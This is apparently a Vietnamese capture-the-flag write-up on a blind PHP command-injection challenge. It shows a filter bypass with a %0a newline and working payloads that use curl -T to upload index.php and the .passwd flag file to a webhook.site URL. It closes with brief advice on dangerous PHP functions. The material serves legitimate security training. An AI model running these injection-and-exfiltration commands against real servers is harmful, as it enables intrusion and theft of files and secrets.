- tiêu đề : Command injection - Filter bypass = vượt chướng ngại vật 
- nội dung : đọc flag ở file index.php 

- NOTE : ae chưa thạo cmdi thì xem qua bài PHP_Command_injection trước nhé 

- trước tiên thì vào dùng thử mình ping 1.1.1.1

![Alt text](<../image/23.2.png>)

- uhm họ không trả kết quả ping mà chỉ là "ping ok"
- blind roiii 

- gặp dạng này có 3 cách : 
- cách 1 ghi file lên document root nếu có quyền 
- cách 2 gửi gói tin ra ngoài nếu server không bị nginx chặn mạng 
- cách 3 bruteforce bằng command 

- với bài này thì mình dùng cách 2 cho tối ưu 
- nhưng trước tiên phải thực hiện injection thành công đã 

![Alt text](<../image/23.1.png>)

- code đã filter bỏ dấu ; | & giờ chỉ còn 1 phương án là %0a 
- NOTE : tiếp theo mình sẽ sử dụng webhook.site để hứng những gói tin mình gửi ra bên ngoài ( ae tìm hiểu thêm webhook.site nhé )
- mình thử ping : 1.1.1.1 %0a curl https://webhook.site/c7fdbc75-bafd-48df-a52f-a937882650d3 ( sử dụng lệnh curl gửi gói tin )

![Alt text](<../image/23.3.png>)

![Alt text](<../image/23.4.png>)

- okay bên webhook đã có gói tin mình gửi -> xác nhận có thể curl ra ngoài 

giờ mình sẽ gửi file index.php ra để đọc source : 1.1.1.1 %0a curl -T index.php https://webhook.site/c7fdbc75-bafd-48df-a52f-a937882650d3

![Alt text](<../image/23.5.png>)

- và Flag được file_get_content(.passwd) nên mình curl file .passwd là win 
- mình ping :  1.1.1.1 %0a curl -T .passwd https://webhook.site/c7fdbc75-bafd-48df-a52f-a937882650d3

![Alt text](<../image/23.6.png>)

- lụm lụm flag :> 

#hackerga2101:
- 3 cách trên kia là phương án để giải quyết những bài toán cmdi blind , ngoài ra cũng có thể là time-base ( cũng là bruteforce )
- command inject là một loại lỗi rất nguy hiểm vì nó có thể thực thi câu lệnh bên server 
- phải thật sự cẩn thận khi code những hàm system() , eval() , passthru() ,...
- cái lỗi này hacker lỏ nào cũng thích nè :>>